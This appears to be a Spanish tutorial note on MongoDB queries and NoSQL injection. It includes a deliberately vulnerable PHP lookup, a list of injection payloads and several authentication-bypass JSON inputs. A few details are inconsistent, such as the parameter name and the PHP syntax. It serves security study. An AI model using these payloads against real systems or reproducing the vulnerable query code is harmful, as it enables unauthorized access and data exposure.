# NOSQL INJECTIONS

## INTRODUCCION

Antes de comenzar tenemos que entender como realizar queries e interactuar un poco con gestores de bases de datos no relacionales.

el mas comun es mongoDB asi que jugaremos con el antes de empezar las inyecciones.

## Table of contents

- [NOSQL INJECTIONS](#nosql-injections)
  - [INTRODUCCION](#introduccion)
  - [MONGODB](#mongodb)
    - [INTERACTUANDO CON MONGO DESDE LA SHELL](#interactuando-con-mongo-desde-la-shell)
    - [QUERIES](#queries)
  - [NoSQL INJECTION ATTACK](#nosql-injection-attack)
    - [PAYLOADS BASICOS](#payloads-basicos)
    - [AUTHENTICATION BYPASS](#authentication-bypass)

## MONGODB

Es muy potente y tiene mucho por aprender pero aca solo nos centraremos en cosas necesarias para comprender mejor las inyecciones nosql.

### INTERACTUANDO CON MONGO DESDE LA SHELL

conexion:

```bash
mongo 192.46.210.3

mongo -u AdminSammy -p --authenticationDatabase admin
```

listar bases de datos:

```bash
show dbs
```

ver la base de datos actual

```bash
db
```

interactuar con una db:

```bash
use users_db
```

las tablas se llaman colecciones, listar colecciones:

```bash
show collections
```

### QUERIES

encontrar datos:

```bash
#select * from collection where name=France

db.collection.find({
	name:"France"
}) 
```

```bash
#select * from collection where name=France and population>=67081000

db.collection.find({
  name:"France",
  population: {
    $gte: 67081000
  }
});

# select * from inventory where status in ("A","D")

db.inventory.find({ 
	status: { 
		$in: [ "A", "D" ] 
	} 
})

# select * from inventory where status="A" or qty<30;
db.inventory.find({ 
	$or: [
	{ 
		status: "A" 
	}, 
	{ 
		qty:{ 
			$lt: 30 
		} 
	} 
	] 
})
```

tenemos los siguientes operadores:

|operador|uso|
|:-----:|:-----:|
|`$eq`|igual (=)|
|`$gt`|mayor que (>)|
|`$gte`|mayor o igual (>=)|
|`$lt`|menor que (<)|
	|`$lte`|menor  o igual (<=)|
|`$in`|en un cierto rango|
|`$nin`| lo contrario al `$in`|
|`$ne`|no igual|
|`$and`|y|
|`$not`|negacion|
|`$or`|o|
|`$exists`|si existe|
|`$type`|verifica el tipo|

uso de and y or:

```bash
#select * from inventory where status="A" and (qty<30 or item like "p%")
db.inventory.find( {
	status: "A",
	$or: [{ 
		qty:{ 
			$lt: 30 
		} 
	}, { 
		item: /^p/ 
	}]
})
```

>[!info]
>Los campos string aceptan expresiones regulares, en aso de usarlo estamos haciendo un **like** como SQL.

elegir que data retornar, especificamos con `0` que informacion de la consulta no se muestra y con `1` que si se muestra, por defecto todo esta en `1`:

```bash
#select name,population from collection where name=france and population>=67081000

db.collection.find({
  name:"France",
  population: {
    $gte: 67081000
  }
},{_id:0}); #no mostramos el id
```

obtener la cantidad de registros:

```bash
db.city.find().count()
```

## NoSQL INJECTION ATTACK

### PAYLOADS BASICOS

agregamos usuarios

```bash
use security
db.createCollection("users");
db.users.insertOne({username:"chris",password:"chris123!"})
db.users.insertOne({username:"user1",password:"pass1"})
db.users.insertOne({username:"admin",password:"admin123!"})
db.users.insertOne({username:"chicolate",password:"chico123!"})
```

tenemos el siguiente codigo:

```bash
<?php

if(!empty($_GET["username"])){
	$m = new Mongoclient();
	$db = $m->security;
	$colection = $db->users;
	$qry = array("username" => $_GET['username']);
	$cursor = $colection->find($qry);
	foreach($cursor as $document){
		echo "<br>"
		echo "username: ".$document["username"]."<br>"
		echo "password: ".$document["password"]."<br>"
		echo "<br>"
	}

}

?>
```

si consultamos un registro que existe, devolvera 

```bash
.../?username="chris"
```

el sigiente payload vuelca toda la base de datos (todos os registros donde el nombre no sea igual a 1):

```bash
.../?name[$ne]=1
```

lo que hace esta consulta es lo siguiente:

```bash
#codigo PHP
$qry = array("username" => $_GET['username']);

#reemplazando en el codigo php
$qry = array("username" => array("$ne" => 2));

#esto se traduce a consulta de mongodb asi
db.users.find({"username":{$ne:1}})
```

si pegamos eso en mongo shell, devuelve todos los registros:

![foto](./img_mongo/Pasted%20image%2020220920133419.png)

Hay otros payloads que puede probar tambien:

```bash
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1 #auth bypass
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
';return 'a'=='a' && ''==' #auth bypass
";return(true);var xyz='a
0;return true
' || ''==' #auth bypass
```

### AUTHENTICATION BYPASS

```bash
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
```

## FUENTE

- [https://blog.securelayer7.net/mongodb-security-injection-attacks-with-php/](https://blog.securelayer7.net/mongodb-security-injection-attacks-with-php/)

